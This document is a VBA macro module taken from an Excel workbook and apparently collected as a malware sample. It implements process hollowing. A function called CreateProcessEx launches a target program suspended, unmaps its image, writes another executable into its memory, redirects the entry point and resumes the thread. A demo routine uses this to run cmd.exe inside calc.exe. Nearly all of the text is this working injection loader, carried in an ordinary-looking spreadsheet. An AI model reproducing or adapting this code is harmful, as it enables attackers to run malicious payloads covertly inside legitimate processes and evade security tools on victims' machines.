Attribute VB_Name = "Module1"
Option Explicit

'========Process creation and memory access staff=========
Public Type PROCESS_INFORMATION
   hProcess As Long
   hThread As Long
   dwProcessId As Long
   dwThreadId As Long
End Type

Public Type STARTUPINFO
   cb As Long
   lpReserved As String
   lpDesktop As String
   lpTitle As String
   dwX As Long
   dwY As Long
   dwXSize As Long
   dwYSize As Long
   dwXCountChars As Long
   dwYCountChars As Long
   dwFillAttribute As Long
   dwFlags As Long
   wShowWindow As Integer
   cbReserved2 As Integer
   lpReserved2 As Long        'LPBYTE
   hStdInput As Long
   hStdOutput As Long
   hStdError As Long
End Type

Public Const CREATE_SUSPENDED = &H4
Public Const MEM_COMMIT As Long = &H1000&
Public Const MEM_RESERVE As Long = &H2000&
Public Const PAGE_NOCACHE As Long = &H200
Public Const PAGE_EXECUTE_READWRITE As Long = &H40
Public Const PAGE_EXECUTE_WRITECOPY As Long = &H80
Public Const PAGE_EXECUTE_READ As Long = &H20
Public Const PAGE_EXECUTE As Long = &H10
Public Const PAGE_READONLY As Long = &H2
Public Const PAGE_WRITECOPY As Long = &H8
Public Const PAGE_NOACCESS As Long = &H1
Public Const PAGE_READWRITE As Long = &H4



'=======Thread context staff===========
Const SIZE_OF_80387_REGISTERS = 80

Type FLOATING_SAVE_AREA
     ControlWord As Long
     StatusWord As Long
     TagWord As Long
     ErrorOffset As Long
     ErrorSelector As Long
     DataOffset As Long
     DataSelector As Long
     RegisterArea(1 To SIZE_OF_80387_REGISTERS) As Byte
     Cr0NpxState As Long
End Type

Public Type CONTEXT86
    ContextFlags As Long
'These are selected by CONTEXT_DEBUG_REGISTERS
    Dr0 As Long
    Dr1 As Long
    Dr2 As Long
    Dr3 As Long
    Dr6 As Long
    Dr7 As Long
'These are selected by CONTEXT_FLOATING_POINT
    FloatSave As FLOATING_SAVE_AREA
'These are selected by CONTEXT_SEGMENTS
    SegGs As Long
    SegFs As Long
    SegEs As Long
    SegDs As Long
'These are selected by CONTEXT_INTEGER
    Edi As Long
    Esi As Long
    Ebx As Long
    Edx As Long
    Ecx As Long
    Eax As Long
'These are selected by CONTEXT_CONTROL
    Ebp As Long
    Eip As Long
    SegCs As Long
    EFlags As Long
    Esp As Long
    SegSs As Long
End Type

Public Const CONTEXT_X86 = &H10000
Public Const CONTEXT86_CONTROL = (CONTEXT_X86 Or &H1)          'SS:SP, CS:IP, FLAGS, BP
Public Const CONTEXT86_INTEGER = (CONTEXT_X86 Or &H2)          'AX, BX, CX, DX, SI, DI
Public Const CONTEXT86_SEGMENTS = (CONTEXT_X86 Or &H4)         'DS, ES, FS, GS
Public Const CONTEXT86_FLOATING_POINT = (CONTEXT_X86 Or &H8)   '387 state
Public Const CONTEXT86_DEBUG_REGISTERS = (CONTEXT_X86 Or &H10) 'DB 0-3,6,7
Public Const CONTEXT86_FULL = (CONTEXT86_CONTROL Or CONTEXT86_INTEGER Or CONTEXT86_SEGMENTS)

'========Main staff for any API code :)===========

'==========PE staff==============
Public Enum ImageSignatureTypes
    IMAGE_DOS_SIGNATURE = &H5A4D     ''\\ MZ
    IMAGE_OS2_SIGNATURE = &H454E     ''\\ NE
    IMAGE_OS2_SIGNATURE_LE = &H454C  ''\\ LE
    IMAGE_VXD_SIGNATURE = &H454C     ''\\ LE
    IMAGE_NT_SIGNATURE = &H4550      ''\\ PE00
End Enum

Public Type IMAGE_DOS_HEADER
    e_magic As Integer        ' Magic number
    e_cblp As Integer         ' Bytes on last page of file
    e_cp As Integer           ' Pages in file
    e_crlc As Integer         ' Relocations
    e_cparhdr As Integer      ' Size of header in paragraphs
    e_minalloc As Integer     ' Minimum extra paragraphs needed
    e_maxalloc As Integer     ' Maximum extra paragraphs needed
    e_ss As Integer           ' Initial (relative) SS value
    e_sp As Integer           ' Initial SP value
    e_csum As Integer         ' Checksum
    e_ip As Integer           ' Initial IP value
    e_cs As Integer           ' Initial (relative) CS value
    e_lfarlc As Integer       ' File address of relocation table
    e_ovno As Integer         ' Overlay number
    e_res(0 To 3) As Integer  ' Reserved words
    e_oemid As Integer        ' OEM identifier (for e_oeminfo)
    e_oeminfo As Integer      ' OEM information; e_oemid specific
    e_res2(0 To 9) As Integer ' Reserved words
    e_lfanew As Long          ' File address of new exe header
End Type

' MSDOS File header
Public Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDateStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    SizeOfOptionalHeader As Integer
    characteristics As Integer
End Type

' Directory format.
Public Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    Size As Long
End Type

' Optional header format.
Const IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16

Public Type IMAGE_OPTIONAL_HEADER
    ' Standard fields.
    Magic As Integer
    MajorLinkerVersion As Byte
    MinorLinkerVersion As Byte
    SizeOfCode As Long
    SizeOfInitializedData As Long
    SizeOfUnitializedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    BaseOfData As Long
    ' NT additional fields.
    ImageBase As Long
    SectionAlignment As Long
    FileAlignment As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion As Integer
    MinorImageVersion As Integer
    MajorSubsystemVersion As Integer
    MinorSubsystemVersion As Integer
    W32VersionValue As Long
    SizeOfImage As Long
    SizeOfHeaders As Long
    CheckSum As Long
    SubSystem As Integer
    DllCharacteristics As Integer
    SizeOfStackReserve As Long
    SizeOfStackCommit As Long
    SizeOfHeapReserve As Long
    SizeOfHeapCommit As Long
    LoaderFlags As Long
    NumberOfRvaAndSizes As Long
    DataDirectory(0 To IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY
End Type

Public Type IMAGE_NT_HEADERS
    Signature As Long
    FileHeader As IMAGE_FILE_HEADER
    OptionalHeader As IMAGE_OPTIONAL_HEADER
End Type

' Section header
Const IMAGE_SIZEOF_SHORT_NAME = 8

Public Type IMAGE_SECTION_HEADER
   SecName As String * IMAGE_SIZEOF_SHORT_NAME
   VirtualSize As Long
   VirtualAddress  As Long
   SizeOfRawData As Long
   PointerToRawData As Long
   PointerToRelocations As Long
   PointerToLinenumbers As Long
   NumberOfRelocations As Integer
   NumberOfLinenumbers As Integer
   characteristics  As Long
End Type

'=============Code================
Public Const OFFSET_4 = 4294967296#

Declare Sub ZeroMemory Lib "kernel32.dll" Alias "RtlZeroMemory" (Destination As Any, ByVal Length As Long)
Public Declare Function GetThreadContext Lib "kernel32" (ByVal hThread As Long, lpContext As CONTEXT86) As Long
Public Declare Function SetThreadContext Lib "kernel32" (ByVal hThread As Long, lpContext As CONTEXT86) As Long
Public Declare Function SuspendThread Lib "kernel32" (ByVal hThread As Long) As Long
Public Declare Function ResumeThread Lib "kernel32" (ByVal hThread As Long) As Long
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Dest As Any, Src As Any, ByVal L As Long)
Public Declare Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal lpAppName As Long, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Public Declare Function ZwUnmapViewOfSection Lib "ntdll.dll" (ByVal hProcess As Long, ByVal BaseAddress As Long) As Long
Public Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Public Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Public Declare Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Public Declare Function VirtualProtectEx Lib "kernel32" (ByVal hProcess As Long, lpAddress As Any, ByVal dwSize As Long, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
Public Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long

Public Function Div(lpNum1 As Long, lpNum2 As Long) As Long
'this is noob but not sure what alternative to use
Dim i1 As Long, i2 As Long
i1 = lpNum1
Do While i1 >= lpNum2
    i1 = i1 - lpNum2
    i2 = i2 + 1
DoEvents
Loop
Div = i2
End Function
Public Function GetAlignedSize(lpSize As Long, lpAlignment As Long) As Long
    If (lpSize Mod lpAlignment) = 0 Then
        GetAlignedSize = lpSize
    Else
        GetAlignedSize = (Div(lpSize, lpAlignment) + 1) * lpAlignment
    End If
End Function

Public Function ImageSize(lpData() As Byte) As Long
Dim lpAlignment As Long, lpSectionLoop As Long
Dim imgNTHeader As IMAGE_NT_HEADERS
Dim imgSection As IMAGE_SECTION_HEADER
Dim imgIDH As IMAGE_DOS_HEADER
Dim i1 As Long, i2 As Long, i3 As Long
Dim lpResult As Long
CopyMemory imgIDH, lpData(0), LenB(imgIDH)
CopyMemory imgNTHeader, ByVal VarPtr(lpData(0)) + imgIDH.e_lfanew, LenB(imgNTHeader)
lpAlignment = imgNTHeader.OptionalHeader.SectionAlignment
If imgNTHeader.OptionalHeader.SizeOfHeaders Mod lpAlignment = 0 Then
    lpResult = imgNTHeader.OptionalHeader.SizeOfHeaders
Else
    lpResult = (Div(imgNTHeader.OptionalHeader.SizeOfHeaders, lpAlignment) + 1) * lpAlignment
End If
i2 = imgIDH.e_lfanew + Len(imgNTHeader)
For i1 = 0 To imgNTHeader.FileHeader.NumberOfSections - 1
    CopyMemory imgSection, lpData(i2 + i1 * Len(imgSection)), Len(imgSection)
    If imgSection.VirtualSize Mod lpAlignment = 0 Then
        lpResult = lpResult + imgSection.VirtualSize
    Else
        lpResult = lpResult + (Div(imgSection.VirtualSize, lpAlignment) + 1) * lpAlignment
    End If
Next
ImageSize = lpResult
End Function

Public Function CreateProcessEx(lpData() As Byte, Optional TargetPath As String) As Long
Dim lpBaseAddress As Long, lpBytes As Long, lpHeaderSize As Long
Dim lpInjectSize As Long, lpSectionLoop As Long, lpSectionSize As Long
Dim lpContext As CONTEXT86, lpFileData As Long, INH As IMAGE_NT_HEADERS
Dim lpProcInfo As PROCESS_INFORMATION, lpStartInfo As STARTUPINFO
Dim ISH As IMAGE_SECTION_HEADER, IDH As IMAGE_DOS_HEADER
Dim i1 As Long, i2 As Long
Dim lpInjectMemory() As Byte

CopyMemory IDH, lpData(0), LenB(IDH)
CopyMemory INH, ByVal VarPtr(lpData(0)) + IDH.e_lfanew, LenB(INH)
lpInjectSize = ImageSize(lpData)
ReDim Preserve lpInjectMemory(0 To lpInjectSize - 1) As Byte
lpFileData = VarPtr(lpInjectMemory(0))
lpHeaderSize = INH.OptionalHeader.SizeOfHeaders

i2 = IDH.e_lfanew + Len(INH)
For i1 = 0 To INH.FileHeader.NumberOfSections - 1
    CopyMemory ISH, lpData(i2 + i1 * Len(ISH)), Len(ISH)
    If ISH.PointerToRawData < lpHeaderSize Then
        If ISH.PointerToRawData <> 0 Then lpHeaderSize = ISH.PointerToRawData
    End If
Next


lpFileData = lpFileData + GetAlignedSize(INH.OptionalHeader.SizeOfHeaders, INH.OptionalHeader.SectionAlignment)
i2 = IDH.e_lfanew + Len(INH)
For i1 = 0 To INH.FileHeader.NumberOfSections - 1
    CopyMemory ISH, lpData(i2 + i1 * Len(ISH)), Len(ISH)
    If ISH.SizeOfRawData > 0 Then
        lpSectionSize = ISH.SizeOfRawData
        If lpSectionSize > ISH.VirtualSize Then lpSectionSize = ISH.VirtualSize
        CopyMemory ByVal lpFileData, lpData(ISH.PointerToRawData), lpSectionSize
        lpFileData = lpFileData + GetAlignedSize(ISH.VirtualSize, INH.OptionalHeader.SectionAlignment)
    Else
        If ISH.VirtualSize <> 0 Then lpFileData = lpFileData + GetAlignedSize(ISH.VirtualSize, INH.OptionalHeader.SectionAlignment)
    End If
Next

CopyMemory lpInjectMemory(0), lpData(0), lpHeaderSize
Dim AppExe
If TargetPath = "" Then TargetPath = AppExe
CreateProcess 0, TargetPath, 0, 0, False, CREATE_SUSPENDED, 0, 0, lpStartInfo, lpProcInfo
ZwUnmapViewOfSection lpProcInfo.hProcess, INH.OptionalHeader.ImageBase
lpContext.ContextFlags = CONTEXT86_FULL
Call GetThreadContext(lpProcInfo.hThread, lpContext)
ReadProcessMemory lpProcInfo.hProcess, ByVal lpContext.Ebx + 8, lpBaseAddress, 4, lpBytes
VirtualAllocEx lpProcInfo.hProcess, ByVal INH.OptionalHeader.ImageBase, lpInjectSize, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE
WriteProcessMemory lpProcInfo.hProcess, ByVal INH.OptionalHeader.ImageBase, lpInjectMemory(0), lpInjectSize, lpBytes
WriteProcessMemory lpProcInfo.hProcess, ByVal lpContext.Ebx + 8, INH.OptionalHeader.ImageBase, 4, lpBytes
lpContext.Eax = INH.OptionalHeader.ImageBase + INH.OptionalHeader.AddressOfEntryPoint
SetThreadContext lpProcInfo.hThread, lpContext
ResumeThread lpProcInfo.hThread
End Function



Sub injection()

    Dim b() As Byte
    Dim test
    Dim hfile As Integer
    
    hfile = FreeFile
    Open "C:\windows\system32\cmd.exe" For Binary Access Read As #hfile
    ReDim b(0 To LOF(hfile))
    Get #hfile, , b
    Close #hfile
test = CreateProcessEx(b, "c:\windows\system32\calc.exe")
MsgBox test
End Sub
Attribute VB_Name = "Sheet1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet2"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet3"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True


INQUEST-PP=macro
